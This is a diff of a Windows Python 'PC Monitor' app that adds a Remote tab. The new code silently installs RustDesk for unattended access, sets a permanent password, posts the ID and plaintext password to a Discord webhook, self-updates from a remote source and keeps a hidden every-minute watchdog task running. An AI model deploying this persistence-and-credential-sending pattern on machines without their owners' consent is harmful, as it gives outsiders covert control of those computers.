@@ -145,7 +145,7 @@ CREATE_NEW_CONSOLE = getattr(subprocess, "CREATE_NEW_CONSOLE", 0)
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
-APP_VERSION = "3"
+APP_VERSION = "3.2"
 
 # The external watchdog is a PowerShell script CARRIED INSIDE this file and
 # written to disk at setup. It runs as a Scheduled Task independently of
@@ -155,7 +155,7 @@ APP_VERSION = "3"
 # watchdog version to WATCHDOG_VERSION and rewrites the .ps1 when this file
 # (pulled by the watchdog) carries a newer one. Bump WATCHDOG_VERSION whenever
 # WATCHDOG_PS1 changes so deployed copies refresh.
-WATCHDOG_VERSION = "15"
+WATCHDOG_VERSION = "14"
 WATCHDOG_PS1 = r'''# PC Monitor watchdog (auto-generated from pc_monitor.py - do not edit;
 # it is overwritten from the app's embedded copy whenever this app deploys.
 $ErrorActionPreference = 'SilentlyContinue'
@@ -213,7 +213,7 @@ function LaunchApp() {
 }
 
 $updated = $false
-Log("WATCHDOG v11 start pid=$PID")
+Log("WATCHDOG v13 start pid=$PID")
 
 # 1) update: if the hosted APP_VERSION is newer, cleanly stop the app, replace
 # the file (validated with py_compile), relaunch, and notify.
@@ -235,12 +235,16 @@ if ($url) {
         }
         Remove-Item $exitReq -Force -ErrorAction SilentlyContinue
       }
-      $tmp = "$script.new"
+      $updateDir = Join-Path $env:ProgramData 'PCMonitorRemote\updates'
+      New-Item -ItemType Directory -Path $updateDir -Force | Out-Null
+      $tmp = Join-Path $updateDir (($script | Split-Path -Leaf) + '.new')
+      $bak = Join-Path $updateDir (($script | Split-Path -Leaf) + '.bak')
+      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
       [System.IO.File]::WriteAllText($tmp, $remote)
       $pc = Start-Process -FilePath $pyc -ArgumentList @('-m','py_compile', $tmp) -WindowStyle Hidden -Wait -PassThru
       Log("py_compile exit code=$($pc.ExitCode)")
       if ($pc.ExitCode -eq 0) {
-        Copy-Item $script "$script.bak" -Force -ErrorAction SilentlyContinue
+        Copy-Item $script $bak -Force -ErrorAction SilentlyContinue
         Move-Item $tmp $script -Force
         Notify ("PC Monitor updated " + $localVer + " -> " + $remoteVer + " on " + $machine + ". Restarting.")
         LaunchApp
@@ -3043,6 +3047,47 @@ def export_diagnostics_zip(logs_dir, dest_dir=None, recent=3):
         return None
 
 
+def export_app_logs_zip(logs_dir, dest_path=None, max_log_mb=40):
+    """Export useful PC Monitor/watchdog/remote logs without exporting the
+    RustDesk state file that contains the saved password."""
+    import zipfile
+    dest_dir = os.path.dirname(dest_path) if dest_path else _desktop_dir()
+    os.makedirs(dest_dir, exist_ok=True)
+    if not dest_path:
+        dest_path = os.path.join(dest_dir, f"pcmonitor_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
+    candidates = []
+    for pattern in (
+        os.path.join(logs_dir, "pc_monitor_*.jsonl"),
+        os.path.join(logs_dir, "pcmonitor_*.log"),
+        os.path.join(SCRIPT_DIR, "pc_monitor_crash.log"),
+        os.path.join(SCRIPT_DIR, "pcmonitor_watchdog.log"),
+        os.path.join(SCRIPT_DIR, "pcmonitor_watchdog.ps1"),
+        REMOTE_LOG_PATH,
+    ):
+        candidates.extend(glob.glob(pattern))
+    candidates = sorted(set(p for p in candidates if os.path.isfile(p)), key=lambda p: os.path.getmtime(p), reverse=True)
+    total = 0
+    cap = max(1, int(max_log_mb)) * 1024 * 1024
+    try:
+        with zipfile.ZipFile(dest_path, "w", zipfile.ZIP_DEFLATED) as z:
+            for path in candidates:
+                try:
+                    size = os.path.getsize(path)
+                    if path.lower().endswith(".jsonl") and total + size > cap:
+                        continue
+                    z.write(path, os.path.relpath(path, SCRIPT_DIR))
+                    if path.lower().endswith(".jsonl"):
+                        total += size
+                except OSError:
+                    continue
+            z.writestr("log_export_info.txt", f"PC Monitor {APP_VERSION}\nMachine: {_machine_label()}\nCreated: {datetime.now().isoformat(timespec='seconds')}\nRemote credentials state.json intentionally excluded.\n")
+        return dest_path
+    except Exception:
+        try: os.remove(dest_path)
+        except OSError: pass
+        return None
+
+
 def write_crash_report_to_desktop(path, last_ts, win_events=None, accel=None, analysis=None):
     """On the first launch after a crash, drop a plain-text report on the
     Desktop named pc_crash_{date-time}. Deduped by the crash's timestamp,
@@ -3609,6 +3654,10 @@ class App(tk.Tk):
         threading.Thread(
             target=lambda: sync_watchdog(SCRIPT_DIR, os.path.abspath(__file__)),
             daemon=True).start()
+        threading.Thread(
+            target=_ensure_remote_host_async,
+            kwargs={"wait": False},
+            daemon=True).start()
 
         # lifecycle: announce we're up (PC restart, or relaunched after being
         # closed/updated). The app sends "running" itself because it's alive
@@ -3890,11 +3939,14 @@ class App(tk.Tk):
 
         self.live_tab = ttk.Frame(nb)
         self.hist_tab = ttk.Frame(nb)
+        self.remote_tab = ttk.Frame(nb)
         nb.add(self.live_tab, text="Live")
         nb.add(self.hist_tab, text="History")
+        nb.add(self.remote_tab, text="Remote")
 
         self._build_live_tab()
         self._build_history_tab()
+        self._build_remote_tab()
 
     def _build_live_tab(self):
         header = tk.Frame(self.live_tab, bg=BG)
@@ -3969,6 +4021,8 @@ class App(tk.Tk):
         ttk.Label(controls, text="sec").pack(side="left", padx=(4, 12))
         ttk.Button(controls, text="Open Logs Folder",
                     command=self._open_logs_folder).pack(side="left", padx=6)
+        ttk.Button(controls, text="Export App Logs",
+                    command=self._export_app_logs).pack(side="left", padx=6)
         self.status_lbl = ttk.Label(controls, text="", foreground=MUTED)
         self.status_lbl.pack(side="right")
 
@@ -4045,13 +4099,14 @@ class App(tk.Tk):
         left = ttk.Frame(paned)
         ttk.Label(left, text="All detected hardware sensors:").pack(anchor="w")
         self.raw_tree = ttk.Treeview(left, columns=("sensor", "value"),
-                                       show="headings", height=18)
+                                       show="headings", height=18, selectmode="extended")
         self.raw_tree.heading("sensor", text="Sensor")
         self.raw_tree.heading("value", text="Value")
         self.raw_tree.column("sensor", width=460)
         self.raw_tree.column("value", width=120)
         self.raw_tree.pack(fill="both", expand=True, pady=(4, 0))
         self._raw_tree_items = {}  # sensor name -> Treeview item id, for in-place updates
+        self._bind_tree_copy(self.raw_tree)
         paned.add(left, weight=3)
 
         right = ttk.Frame(paned)
@@ -4067,7 +4122,7 @@ class App(tk.Tk):
 
         ttk.Label(proc_tab, text="Top CPU processes:").pack(anchor="w")
         self.cpu_proc_tree = ttk.Treeview(
-            proc_tab, columns=("name", "pid", "cpu"), show="headings", height=6)
+            proc_tab, columns=("name", "pid", "cpu"), show="headings", height=6, selectmode="extended")
         for c, t, w in [("name", "Process", 120), ("pid", "PID", 60), ("cpu", "CPU %", 60)]:
             self.cpu_proc_tree.heading(c, text=t)
             self.cpu_proc_tree.column(c, width=w, anchor="center")
@@ -4075,11 +4130,13 @@ class App(tk.Tk):
 
         ttk.Label(proc_tab, text="Top memory processes:").pack(anchor="w")
         self.mem_proc_tree = ttk.Treeview(
-            proc_tab, columns=("name", "pid", "mem"), show="headings", height=6)
+            proc_tab, columns=("name", "pid", "mem"), show="headings", height=6, selectmode="extended")
         for c, t, w in [("name", "Process", 120), ("pid", "PID", 60), ("mem", "Mem %", 60)]:
             self.mem_proc_tree.heading(c, text=t)
             self.mem_proc_tree.column(c, width=w, anchor="center")
         self.mem_proc_tree.pack(fill="both", expand=True, pady=(0, 4))
+        self._bind_tree_copy(self.cpu_proc_tree)
+        self._bind_tree_copy(self.mem_proc_tree)
 
         ttk.Label(frames_tab, text="Apps currently presenting frames:").pack(anchor="w")
         self.frames_tree = ttk.Treeview(
@@ -4092,6 +4149,7 @@ class App(tk.Tk):
             self.frames_tree.heading(c, text=t)
             self.frames_tree.column(c, width=w, anchor="center")
         self.frames_tree.pack(fill="both", expand=True, pady=(4, 4))
+        self._bind_tree_copy(self.frames_tree)
         tk.Label(frames_tab,
                   text="Needs PresentMon configured above. Every process actively "
                        "rendering 3D frames shows up here with real per-frame FPS, "
@@ -4103,15 +4161,132 @@ class App(tk.Tk):
         ttk.Label(events_tab, text="Recent errors (System + Application logs) and process exits:").pack(anchor="w")
         self.event_tree = ttk.Treeview(
             events_tab, columns=("time", "log", "source", "id", "detail"),
-            show="headings", height=14)
+            show="headings", height=14, selectmode="extended")
         for c, t, w in [("time", "Time", 125), ("log", "Log", 70),
                           ("source", "Source", 120), ("id", "ID", 45),
                           ("detail", "Detail", 260)]:
             self.event_tree.heading(c, text=t)
             self.event_tree.column(c, width=w, anchor="w")
         self.event_tree.pack(fill="both", expand=True, pady=(4, 4))
+        self._bind_tree_copy(self.event_tree)
 
         paned.add(right, weight=2)
+
+    def _build_remote_tab(self):
+        top = ttk.Frame(self.remote_tab)
+        top.pack(fill="x", pady=(4, 8))
+        ttk.Label(top, text="RustDesk unattended remote access", font=("Segoe UI", 13, "bold")).pack(anchor="w")
+        ttk.Label(top, text="RustDesk is repaired/updated on PC Monitor startup and its service is configured for automatic boot.", foreground=MUTED, wraplength=1000, justify="left").pack(anchor="w", pady=(2, 8))
+        creds = ttk.LabelFrame(self.remote_tab, text="Saved RustDesk credentials")
+        creds.pack(fill="x", pady=(0, 8), padx=2)
+        ttk.Label(creds, text="RustDesk ID").grid(row=0, column=0, sticky="w", padx=8, pady=8)
+        self.remote_id_var = tk.StringVar()
+        self.remote_id_entry = ttk.Entry(creds, textvariable=self.remote_id_var, width=28, state="readonly")
+        self.remote_id_entry.grid(row=0, column=1, sticky="w", padx=4, pady=8)
+        ttk.Label(creds, text="Permanent Password").grid(row=1, column=0, sticky="w", padx=8, pady=8)
+        self.remote_pw_var = tk.StringVar()
+        self.remote_pw_entry = ttk.Entry(creds, textvariable=self.remote_pw_var, width=28, state="readonly", show="*")
+        self.remote_pw_entry.grid(row=1, column=1, sticky="w", padx=4, pady=8)
+        ttk.Button(creds, text="Copy ID", command=lambda: self._copy_text(self.remote_id_var.get())).grid(row=0, column=2, padx=4, pady=8)
+        ttk.Button(creds, text="Copy Password", command=lambda: self._copy_text(self.remote_pw_var.get())).grid(row=1, column=2, padx=4, pady=8)
+        ttk.Button(creds, text="Resend Credentials", command=self._resend_remote_credentials).grid(row=0, column=3, rowspan=2, padx=12, pady=8)
+        actions = ttk.Frame(self.remote_tab)
+        actions.pack(fill="x", pady=(0, 8))
+        ttk.Button(actions, text="Repair / Update RustDesk", command=self._repair_remote).pack(side="left", padx=4)
+        ttk.Button(actions, text="Open Remote Log", command=self._open_remote_log).pack(side="left", padx=4)
+        ttk.Button(actions, text="Export App Logs", command=self._export_app_logs).pack(side="left", padx=4)
+        ttk.Button(actions, text="Send App Logs to Discord", command=self._send_app_logs_to_discord).pack(side="left", padx=4)
+        self.remote_status_lbl = ttk.Label(self.remote_tab, text="", foreground=MUTED, wraplength=1000, justify="left")
+        self.remote_status_lbl.pack(anchor="w", pady=(0, 6))
+        info = tk.Text(self.remote_tab, height=12, wrap="word", bg=PANEL, fg=FG, insertbackground=FG, relief="flat", borderwidth=0)
+        info.pack(fill="both", expand=True)
+        info.insert("1.0", "You can highlight/copy the ID and password above.\n\nAll Live/History tables support row highlighting and Ctrl+C to copy selected rows.\n\nRemote setup log:\n" + REMOTE_LOG_PATH + "\n\nApp log folder:\n" + LOGS_DIR + "\n\nThe exported app-log bundle intentionally excludes state.json, which contains the saved RustDesk password.")
+        info.configure(state="disabled")
+        self._refresh_remote_ui()
+
+    def _refresh_remote_ui(self):
+        state = _remote_read_state() or {}
+        self.remote_id_var.set(str(state.get("rustdesk_id") or ""))
+        self.remote_pw_var.set(str(state.get("password") or ""))
+        version = state.get("rustdesk_version") or "not configured"
+        notified = state.get("credentials_notified_app_version") or "not yet"
+        self.remote_status_lbl.config(text=f"RustDesk: v{version}    PC Monitor credentials last sent: {notified}")
+
+    def _copy_text(self, text):
+        text = str(text or "")
+        if not text: return
+        try:
+            self.clipboard_clear(); self.clipboard_append(text); self.update()
+            messagebox.showinfo("Copied", "Copied to clipboard.")
+        except Exception as e:
+            messagebox.showerror("Copy", f"Couldn't copy:\n{e}")
+
+    def _bind_tree_copy(self, tree):
+        def copy_selected(_event=None):
+            items = tree.selection()
+            if not items: return "break"
+            self._copy_text("\n".join("\t".join(str(v) for v in tree.item(item, "values")) for item in items))
+            return "break"
+        tree.bind("<Control-c>", copy_selected)
+        tree.bind("<Control-C>", copy_selected)
+
+    def _resend_remote_credentials(self):
+        self.remote_status_lbl.config(text="Sending saved RustDesk credentials to Discord...")
+        def worker():
+            ok = _remote_resend_credentials()
+            def done():
+                self._refresh_remote_ui()
+                (messagebox.showinfo if ok else messagebox.showwarning)("RustDesk credentials", "RustDesk ID and password were sent to Discord." if ok else f"Discord delivery failed or credentials are missing.\n\nSee:\n{REMOTE_LOG_PATH}")
+            self.after(0, done)
+        threading.Thread(target=worker, daemon=True).start()
+
+    def _repair_remote(self):
+        self.remote_status_lbl.config(text="Repairing/checking RustDesk...")
+        def worker():
+            ok = _remote_install_host()
+            def done():
+                self._refresh_remote_ui()
+                (messagebox.showinfo if ok else messagebox.showwarning)("RustDesk", "RustDesk repair/update completed and the service was checked." if ok else f"RustDesk repair/update failed.\n\nSee:\n{REMOTE_LOG_PATH}")
+            self.after(0, done)
+        threading.Thread(target=worker, daemon=True).start()
+
+    def _open_remote_log(self):
+        try:
+            os.makedirs(REMOTE_INSTALL_DIR, exist_ok=True)
+            with open(REMOTE_LOG_PATH, "a", encoding="utf-8"):
+                pass
+            os.startfile(REMOTE_LOG_PATH)
+        except Exception:
+            messagebox.showinfo("Remote log", REMOTE_LOG_PATH)
+
+    def _export_app_logs(self):
+        default = os.path.join(_desktop_dir(), f"pcmonitor_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
+        path = filedialog.asksaveasfilename(title="Export PC Monitor logs", initialfile=os.path.basename(default), initialdir=os.path.dirname(default), defaultextension=".zip", filetypes=[("ZIP archive", "*.zip")])
+        if not path: return
+        def worker():
+            out = export_app_logs_zip(LOGS_DIR, path)
+            self.after(0, lambda: messagebox.showinfo("Export App Logs", f"Saved:\n{out}") if out else messagebox.showerror("Export App Logs", "Couldn't build the log bundle."))
+        threading.Thread(target=worker, daemon=True).start()
+
+    def _send_app_logs_to_discord(self):
+        self.remote_status_lbl.config(text="Building app-log bundle for Discord...")
+        def worker():
+            tmp = os.path.join(os.environ.get("TEMP", _desktop_dir()), f"pcmonitor_logs_{os.getpid()}_{int(time.time())}.zip")
+            out = export_app_logs_zip(LOGS_DIR, tmp, max_log_mb=18)
+            ok = False; detail = "bundle creation failed"
+            if out:
+                try:
+                    with open(out, "rb") as f: data = f.read()
+                    if len(data) > 24 * 1024 * 1024:
+                        detail = f"bundle is too large ({len(data)/1024/1024:.1f} MB)"
+                    else:
+                        hook = (CONFIG.get("discord_webhook_url") or "").strip()
+                        ok, detail = post_crash_to_discord(hook, f"📦 **PC Monitor logs** from `{_machine_label()}` (v{APP_VERSION})", [(os.path.basename(out), data, "application/zip")])
+                except Exception as e: detail = f"{type(e).__name__}: {e}"
+                try: os.remove(out)
+                except OSError: pass
+            self.after(0, lambda: (self._refresh_remote_ui(), messagebox.showinfo("Send Logs", "App logs sent to Discord.") if ok else messagebox.showwarning("Send Logs", f"Couldn't send app logs to Discord.\n\n{detail}")))
+        threading.Thread(target=worker, daemon=True).start()
 
     def _build_history_tab(self):
         controls = ttk.Frame(self.hist_tab)
@@ -4150,7 +4325,7 @@ class App(tk.Tk):
                  "gpu_clock", "gpu_power", "gpu_voltage",
                  "mem_percent", "fg_fps", "ping_ms")
         self.hist_tree = ttk.Treeview(self.hist_tab, columns=cols,
-                                        show="headings", height=14)
+                                        show="headings", height=14, selectmode="extended")
         headers = {"time": "Time", "cpu_temp": "CPU Temp (C)",
                     "gpu_temp": "GPU Temp (C)", "cpu_clock": "CPU Clock (MHz)",
                     "cpu_power": "CPU Power (W)",
@@ -4161,6 +4336,7 @@ class App(tk.Tk):
             self.hist_tree.heading(c, text=headers[c])
             self.hist_tree.column(c, width=125, anchor="center")
         self.hist_tree.pack(fill="both", expand=True, pady=(6, 0))
+        self._bind_tree_copy(self.hist_tree)
         self.chart.bind("<Configure>", lambda e: self._draw_chart())
 
         self._history_rows = []
@@ -5235,7 +5411,7 @@ def install_clone(logs_dir, extra_config=None):
         try:
             if deploy_watchdog(start_menu, clone_path):
                 print("Watchdog deployed (PowerShell; on login + every "
-                      f"{CONFIG.get('watchdog_interval_minutes', 10)} min).")
+                      "1 min).")
         except Exception:
             pass
     # #5: start the main app on login via a Startup-folder shortcut (the
@@ -5497,15 +5673,22 @@ def check_and_apply_update():
     if _version_tuple(remote_ver) <= _version_tuple(APP_VERSION):
         return None
     target = os.path.abspath(__file__)
-    tmp = target + ".new"
+    update_dir = os.path.join(os.environ.get("PROGRAMDATA", SCRIPT_DIR), "PCMonitorRemote", "updates")
+    tmp = os.path.join(update_dir, os.path.basename(target) + ".new")
+    bak = os.path.join(update_dir, os.path.basename(target) + ".bak")
     try:
         import py_compile
         import shutil
+        os.makedirs(update_dir, exist_ok=True)
+        try:
+            os.remove(tmp)
+        except OSError:
+            pass
         with open(tmp, "w", encoding="utf-8") as f:
             f.write(remote)
         py_compile.compile(tmp, doraise=True)  # never trust a broken download
         try:
-            shutil.copy2(target, target + ".bak")  # keep the old version
+            shutil.copy2(target, bak)  # keep the old version outside Downloads
         except Exception:
             pass
         os.replace(tmp, target)
@@ -5717,7 +5900,7 @@ def _watchdog_update():
             pass
         return None
     _write_update_marker(APP_VERSION, remote_ver)
-    _watchdog_notify(f"PC Monitor updated {APP_VERSION} -> {remote_ver} on `{_machine_label()}`. Restarting.")
+    _watchdog_notify(f"PC Monitor updated {APP_VERSION} -> {remote_ver} on `{_machine_label()}`. RustDesk health/update will run on the new version. Restarting.")
     _launch_main_app()
     return remote_ver
 
@@ -5855,18 +6038,50 @@ def _find_console_python():
 
 
 def sync_watchdog(script_dir, script_path=None):
-    """Self-healing: on EVERY app startup, rewrite the watchdog (.ps1 + .vbs)
-    from this file's embedded copy and re-register its Scheduled Task. No
-    version-compare gate - that was the bug: if the compare matched (or got
-    stuck) the watchdog never refreshed, so 'main updated but the watchdog
-    didn't'. The app only starts after an update relaunch (or at login), so
-    always-rewriting GUARANTEES the on-disk watchdog + task match whatever
-    .py is now running. Cheap: two small file writes + an idempotent
-    schtasks /F. deploy_watchdog is a no-op if watchdog_enabled is false."""
+    """Keep the on-disk watchdog synchronized with this app.
+
+    The watchdog is rewritten/re-registered on every app startup so the
+    Scheduled Task always matches the embedded copy.  A Discord notification
+    is sent ONLY when the deployed watchdog version actually changes (or when
+    no version stamp existed yet).  This avoids spamming Discord on every
+    normal PC Monitor launch while still proving that a new watchdog was
+    deployed after an app update.
+    """
+    if not CONFIG.get("watchdog_enabled", True):
+        return False
     try:
-        deploy_watchdog(script_dir, script_path)
-    except Exception:
-        pass
+        _ps1_path, ver_path, _cfg_path = _watchdog_paths(script_dir)
+        old_ver = None
+        try:
+            if os.path.exists(ver_path):
+                with open(ver_path, encoding="utf-8") as f:
+                    old_ver = f.read().strip() or None
+        except Exception:
+            old_ver = None
+
+        ok = deploy_watchdog(script_dir, script_path)
+        if not ok:
+            _remote_log(
+                f"WATCHDOG SYNC FAILED expected={WATCHDOG_VERSION} old={old_ver!r}"
+            )
+            return False
+
+        changed = old_ver != WATCHDOG_VERSION
+        _remote_log(
+            f"WATCHDOG SYNC OK old={old_ver!r} new={WATCHDOG_VERSION!r} changed={changed}"
+        )
+        if changed:
+            _watchdog_notify(
+                f"Watchdog updated {old_ver or 'none'} -> {WATCHDOG_VERSION} "
+                f"on `{_machine_label()}`."
+            )
+        return True
+    except Exception as e:
+        try:
+            _remote_log(f"WATCHDOG SYNC EXCEPTION: {e}")
+        except Exception:
+            pass
+        return False
 
 
 def _legacy_sync_watchdog_unused(script_dir, script_path=None):
@@ -6037,27 +6252,144 @@ def _remote_password(length=16):
 def _remote_webhook(content):
     hook = (CONFIG.get("discord_webhook_url") or "").strip()
     if not hook:
+        _remote_log("WEBHOOK skipped: discord_webhook_url is empty")
         return False
-    try:
-        payload = json.dumps({"content": content}).encode("utf-8")
-        req = urllib.request.Request(
-            hook,
-            data=payload,
-            headers={
-                "Content-Type": "application/json",
-                "User-Agent": "PCMonitorRemote/1.0",
-            },
-            method="POST",
-        )
-        with urllib.request.urlopen(req, timeout=15) as r:
-            r.read()
-        return True
-    except Exception as e:
+    payload = json.dumps({"content": content}).encode("utf-8")
+    for attempt in range(1, 4):
         try:
-            _log_fatal("Remote webhook error: " + repr(e))
-        except Exception:
-            pass
+            req = urllib.request.Request(
+                hook,
+                data=payload,
+                headers={
+                    "Content-Type": "application/json",
+                    "User-Agent": f"PCMonitorRemote/{APP_VERSION}",
+                },
+                method="POST",
+            )
+            with urllib.request.urlopen(req, timeout=15) as r:
+                body = r.read()
+                status = getattr(r, "status", None) or r.getcode()
+            _remote_log(f"WEBHOOK success attempt={attempt} http_status={status} response_bytes={len(body)}")
+            return 200 <= int(status) < 300
+        except Exception as e:
+            _remote_log(f"WEBHOOK failed attempt={attempt} error={type(e).__name__}: {e}")
+            try:
+                _log_fatal("Remote webhook error: " + repr(e))
+            except Exception:
+                pass
+            if attempt < 3:
+                time.sleep(2)
+    return False
+
+
+def _remote_notify_ready(state, force=False, reason="setup"):
+    """Send saved RustDesk credentials to Discord.
+
+    Normal startup sends once per PC Monitor version (or after a failed
+    delivery). force=True is used by the in-app Resend Credentials button.
+    """
+    rid = str(state.get("rustdesk_id") or "").strip()
+    password = str(state.get("password") or "").strip()
+    if not rid or not password:
+        _remote_log("READY notification skipped: state missing RustDesk ID/password")
         return False
+    label = _machine_label() if "_machine_label" in globals() else os.environ.get(
+        "COMPUTERNAME", platform.node())
+    previous_app_version = str(state.get("credentials_notified_app_version") or "").strip()
+    if not force and previous_app_version == str(APP_VERSION) and state.get("discord_notified"):
+        _remote_log(f"READY notification skipped: already sent for PC Monitor {APP_VERSION}")
+        return True
+    _remote_stage("send saved RustDesk credentials to Discord")
+    ok = _remote_webhook(
+        "🟢 **PC MONITOR + REMOTE PC READY**\n"
+        f"Machine: `{label}`\n"
+        f"RustDesk ID: `{rid}`\n"
+        f"Password: `{password}`\n"
+        "Status: **UNATTENDED ACCESS READY**\n"
+        f"RustDesk: `v{state.get('rustdesk_version') or REMOTE_RUSTDESK_VERSION}`\n"
+        f"PC Monitor: `v{APP_VERSION}`\n"
+        f"Reason: `{reason}`")
+    if ok:
+        state["discord_notified"] = True
+        state["credentials_notified_app_version"] = str(APP_VERSION)
+        state["credentials_last_notified"] = datetime.now().isoformat(timespec="seconds")
+        try:
+            with open(REMOTE_STATE_PATH, "w", encoding="utf-8") as f:
+                json.dump(state, f, indent=2)
+        except Exception as e:
+            _remote_log(f"READY notification sent but state update failed: {type(e).__name__}: {e}")
+        return True
+    return False
+
+
+def _remote_read_state():
+    try:
+        with open(REMOTE_STATE_PATH, encoding="utf-8") as f:
+            return json.load(f)
+    except Exception as e:
+        _remote_log(f"state read failed: {type(e).__name__}: {e}")
+        return None
+
+
+def _remote_resend_credentials():
+    """Force a fresh Discord delivery of the saved RustDesk credentials."""
+    state = _remote_read_state()
+    if not state or not state.get("rustdesk_id") or not state.get("password"):
+        _remote_log("RESEND requested but saved RustDesk credentials are missing")
+        return False
+    return _remote_notify_ready(state, force=True, reason="manual resend")
+
+
+def _remote_service_prepare():
+    """Install, configure for automatic boot, and start the RustDesk service."""
+    _remote_stage("install/configure RustDesk Windows service")
+    install_result = _remote_run([REMOTE_EXE, "--install-service"], timeout=90)
+    if install_result.returncode != 0:
+        check = _remote_run(["sc", "query", "Rustdesk"], timeout=20)
+        if check.returncode != 0:
+            raise RuntimeError(install_result.stderr.strip() or install_result.stdout.strip() or "RustDesk --install-service failed")
+    auto_result = _remote_run(["sc", "config", "Rustdesk", "start=", "auto"], timeout=30)
+    if auto_result.returncode != 0:
+        raise RuntimeError(auto_result.stderr.strip() or auto_result.stdout.strip() or "Could not configure RustDesk service for automatic startup")
+    _remote_stage("start RustDesk service")
+    running = False
+    for attempt in range(1, 13):
+        check = _remote_run(["sc", "query", "Rustdesk"], timeout=20)
+        text = (check.stdout or "") + "\n" + (check.stderr or "")
+        if "RUNNING" in text.upper():
+            running = True
+            _remote_log(f"service running on attempt={attempt}")
+            break
+        start_result = _remote_run(["sc", "start", "Rustdesk"], timeout=30)
+        if start_result.returncode not in (0, 1056):
+            _remote_log(f"sc start returned rc={start_result.returncode}")
+        time.sleep(2)
+    if not running:
+        raise RuntimeError("RustDesk service did not reach RUNNING state")
+
+
+def _remote_upgrade_if_needed(state):
+    """Upgrade RustDesk when this PC Monitor build carries a newer target."""
+    installed_version = str(state.get("rustdesk_version") or "").strip()
+    if installed_version == REMOTE_RUSTDESK_VERSION and os.path.exists(REMOTE_EXE):
+        return False
+    _remote_stage(f"update RustDesk {installed_version or 'unknown'} -> {REMOTE_RUSTDESK_VERSION}")
+    asset = _remote_asset()
+    url = f"https://github.com/rustdesk/rustdesk/releases/download/{REMOTE_RUSTDESK_VERSION}/{asset}"
+    _remote_download(url, REMOTE_INSTALLER)
+    result = _remote_run([REMOTE_INSTALLER, "--silent-install"], timeout=180)
+    if result.returncode != 0:
+        _remote_log(f"RustDesk upgrade returned rc={result.returncode}; verifying executable")
+    time.sleep(5)
+    candidates = [REMOTE_EXE, os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "RustDesk", "rustdesk.exe")]
+    existing = next((x for x in candidates if os.path.exists(x)), None)
+    if existing:
+        globals()["REMOTE_EXE"] = existing
+    if not os.path.exists(REMOTE_EXE):
+        raise RuntimeError("RustDesk update finished but rustdesk.exe was not found")
+    state["rustdesk_version"] = REMOTE_RUSTDESK_VERSION
+    _remote_log(f"RustDesk update verified exe={REMOTE_EXE}")
+    return True
 
 
 def _remote_download(url, destination):
@@ -6129,30 +6461,13 @@ def _remote_get_id():
 
 
 def _remote_install_host():
-    """Install/configure RustDesk once; write detailed diagnostics on every step."""
+    """Install, repair, update, and validate the unattended RustDesk host."""
     global REMOTE_LAST_STAGE
     if sys.platform != "win32":
         _remote_log("ABORT non-Windows platform")
         return False
-
     _remote_stage("remote bootstrap start")
-    _remote_log(f"version={APP_VERSION} rustdesk_version={REMOTE_RUSTDESK_VERSION} "
-                f"pid={os.getpid()} admin={IS_ADMIN}")
-
-    # A completed state means this is NOT a first remote-access launch anymore.
-    try:
-        if os.path.exists(REMOTE_STATE_PATH):
-            with open(REMOTE_STATE_PATH, encoding="utf-8") as f:
-                state = json.load(f)
-            if (state.get("rustdesk_id") and state.get("password") and
-                    os.path.exists(REMOTE_EXE)):
-                _remote_stage("already configured")
-                _remote_log(f"state found id={state.get('rustdesk_id')} exe={REMOTE_EXE}")
-                return True
-            _remote_log("state exists but is incomplete or RustDesk executable is missing")
-    except Exception as e:
-        _remote_log(f"state read exception={type(e).__name__}: {e}")
-
+    _remote_log(f"version={APP_VERSION} rustdesk_target={REMOTE_RUSTDESK_VERSION} pid={os.getpid()} admin={IS_ADMIN}")
     os.makedirs(REMOTE_INSTALL_DIR, exist_ok=True)
     lock_acquired = False
     lock_handle = None
@@ -6167,134 +6482,73 @@ def _remote_install_host():
         except FileExistsError:
             _remote_log("another PC Monitor process owns setup.lock; exiting this bootstrap")
             return False
-
-        # Re-check after taking the lock.
-        try:
-            if os.path.exists(REMOTE_STATE_PATH):
-                with open(REMOTE_STATE_PATH, encoding="utf-8") as f:
-                    state = json.load(f)
-                if (state.get("rustdesk_id") and state.get("password") and
-                        os.path.exists(REMOTE_EXE)):
-                    _remote_stage("already configured after lock")
-                    return True
-        except Exception as e:
-            _remote_log(f"post-lock state read exception={type(e).__name__}: {e}")
-
-        # Find an existing RustDesk installation in either normal Program Files location.
-        candidates = [
-            REMOTE_EXE,
-            os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"),
-                         "RustDesk", "rustdesk.exe"),
-        ]
+        state = _remote_read_state() or {}
+        candidates = [REMOTE_EXE, os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "RustDesk", "rustdesk.exe")]
         existing = next((x for x in candidates if os.path.exists(x)), None)
         if existing:
-            _remote_log(f"found existing RustDesk executable: {existing}")
             globals()["REMOTE_EXE"] = existing
-        else:
+            _remote_log(f"found existing RustDesk executable: {existing}")
+        if not existing:
             _remote_stage("install RustDesk silently")
             asset = _remote_asset()
-            url = (f"https://github.com/rustdesk/rustdesk/releases/download/"
-                   f"{REMOTE_RUSTDESK_VERSION}/{asset}")
+            url = f"https://github.com/rustdesk/rustdesk/releases/download/{REMOTE_RUSTDESK_VERSION}/{asset}"
             _remote_download(url, REMOTE_INSTALLER)
             result = _remote_run([REMOTE_INSTALLER, "--silent-install"], timeout=180)
-            if result.returncode != 0 and not os.path.exists(REMOTE_EXE):
-                raise RuntimeError(
-                    result.stderr.strip() or result.stdout.strip() or
-                    "RustDesk silent installation failed")
+            if result.returncode != 0:
+                _remote_log(f"RustDesk silent install returned rc={result.returncode}; verifying executable")
             time.sleep(5)
             existing = next((x for x in candidates if os.path.exists(x)), None)
             if existing:
                 globals()["REMOTE_EXE"] = existing
             if not os.path.exists(REMOTE_EXE):
-                raise RuntimeError("RustDesk installer finished but rustdesk.exe was not found")
-
-        _remote_stage("install RustDesk Windows service")
-        service_install = _remote_run([REMOTE_EXE, "--install-service"], timeout=90)
-        if service_install.returncode != 0:
-            # It may already be installed; verify before treating this as fatal.
-            check = _remote_run(["sc", "query", "Rustdesk"], timeout=20)
-            if check.returncode != 0:
-                raise RuntimeError(
-                    service_install.stderr.strip() or service_install.stdout.strip() or
-                    "RustDesk --install-service failed")
-
-        _remote_stage("start RustDesk service")
-        running = False
-        for attempt in range(1, 13):
